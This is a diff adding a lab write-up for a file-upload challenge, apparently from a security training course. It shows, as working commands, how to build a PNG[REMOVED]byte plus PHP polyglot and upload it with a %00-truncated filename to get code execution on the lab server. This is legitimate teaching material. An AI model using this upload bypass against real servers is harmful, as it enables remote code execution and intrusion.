@@ -373,7 +373,7 @@ ls -lhS /usr/share/seclists/Discovery/DNS/ | head
 ## -rw-r--r-- 1 root root 1.4M Sep 19  2025 bitquark-subdomains-top100000.txt
 ```
 
-# fuzzing with `dns-Jhaddix.txt` (26 MB)
+## fuzzing with `dns-Jhaddix.txt` (26 MB)
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt \        
@@ -916,5 +916,123 @@ cat 2-flag.txt
 
 git add .
 git commit -m "2-flag.txt"
+git push
+```
+
+---
+
+## 3. What mystery the Magic Numbers Hide ?
+
+With client-side and basic server-side restrictions behind you, the challenge now escalates to bypassing server-side validation that inspects the content of uploaded files, specifically through magic numbers.
+Magic numbers are unique values at the beginning of files that identify the file format to the system.
+
+This task involves manipulating an uploaded file's magic numbers to pass it off as a benign type while maintaining its malicious functionality.
+Successfully fooling the server's content inspection will reveal another hidden `Flag` ⛳️.
+
+- Main Domain: http://[vuln-subdomain].web0x05.hbtn/task3
+
+You will need to use this php command to read the flag: `<?php readfile('FLAG_3.txt') ?>`, FLAG will only be generated if you upload a php file!
+
+**Useful Instructions**
+
+1. Research and understand the concept of magic numbers in file formats. Identify the magic numbers for both the file type you intend to upload and a benign file type that is allowed by the server.
+2. Craft a file that begins with the magic numbers of an allowed file type but contains payload or code typical of a restricted file type. Tools like hex editors can help you modify the file content directly.
+3. Test your crafted file by attempting to upload it through the application's upload feature. Pay close attention to how the application responds to determine if your bypass was successful.
+4. If direct modification of magic numbers does not yield success, consider more advanced techniques such as embedding your malicious payload within a benign file in a way that does not affect the file's ability to pass as the benign type but still allows execution of the payload under certain conditions.
+
+---
+
+First, confirm task3's API base.
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/task3 | grep -oE 'data-url="[^"]*"'
+# data-url="/api/task3/"
+```
+
+Let's make sure our payload is correct for this task, then POST it.
+
+```bash
+printf "%s" "<?php readfile('FLAG_3.txt') ?>" > shell3.php
+
+cat shell3.php
+#<?php readfile('FLAG_3.txt') ?>
+
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@shell3.php;filename=test.png;type=image/png"
+
+# {"error":"File type not allowed or does not meet the criteria."}
+```
+
+Now let's see what a genuine image looks like when accepted — this gives us the success baseline and confirms which magic bytes satisfy the check. Let's craft a minimal valid PNG and upload it (named as a normal `.png`, pure image content).
+
+```bash
+printf '\x89PNG\r\n\x1a\n' > real.png
+
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@real.png;filename=real.png;type=image/png"
+
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 13:49:35 GMT
+# Content-Type: application/json
+# Content-Length: 63
+# Connection: keep-alive
+# 
+# {"message":"'/static/upload/real.png' uploaded successfully."}
+```
+
+- `printf '\x89PNG\r\n\x1a\n' > real.png` — writes the 8-byte PNG signature (magic number): `89 50 4E 47 0D 0A 1A 0A`. This is the exact byte sequence every PNG file starts with, and it's what a magic-number check looks for. (It's not a complete valid PNG image, but many naive content checks only inspect the leading signature bytes — we're testing whether that's enough.)
+- `-F "file=@real.png;filename=real.png;type=image/png"` — upload it with a clean `.png` name and image MIME.
+
+**Result**
+
+The bare 8-byte PNG signature was accepted. That tells us the content check is shallow: it only inspects the leading magic bytes, not the full image structure (no `getimagesize()`, no real decoder). So our polyglot doesn't need to be a valid image at all — it just needs to start with **`\x89PNG\r\n\x1a\n`** and then carry our PHP.
+
+Now we combine everything we've learned across all three tasks:
+
+- **Content check (task3)**: satisfied by leading PNG magic bytes.
+- **Name check (task2)**: `.php` in the final position is rejected, but the `%00` truncation trick lands the file as executable `.php`.
+- Execution: files in `/static/upload/` run as PHP.
+
+So the winning file is: **PNG magic number** + **PHP payload**, uploaded with a `%00`-truncation filename so it saves as `.php`. Let's build it.
+
+```bash
+printf '\x89PNG\r\n\x1a\n<?php readfile("FLAG_3.txt"); ?>' > poly.php
+
+xxd poly.php | head
+# 00000000: 8950 4e47 0d0a 1a0a 3c3f 7068 7020 7265  .PNG....<?php re
+# 00000010: 6164 6669 6c65 2822 464c 4147 5f33 2e74  adfile("FLAG_3.t
+# 00000020: 7874 2229 3b20 3f3e                      xt"); ?>
+```
+
+The hex confirms a clean polyglot: it starts with exactly `8950 4e47 0d0a 1a0a` (the PNG magic number), immediately followed by` <?php readfile("FLAG_3.txt"); ?>`. The content check will see PNG; PHP will execute the code. Now we upload it with the `%00`-truncation filename so it also beats the name filter and lands as executable `.php`.
+
+```bash
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@poly.php;filename=poly.php%00.png;type=image/png"
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 14:01:28 GMT
+# Content-Type: application/json
+# Content-Length: 63
+# Connection: keep-alive
+# 
+# {"message":"'/static/upload/poly.php' uploaded successfully."}
+```
+
+Now execute the php
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/static/upload/poly.php
+# �PNG
+# 
+# ec648cc8d3e91ebb41e347dbb94aa452                                         ```
+
+Save and check the flag.
+
+```bash
+echo ec648cc8d3e91ebb41e347dbb94aa452 > 3-flag.txt
+
+cat 3-flag.txt
+
+git add .
+git commit -m "3-flag.txt"
 git push
 ```
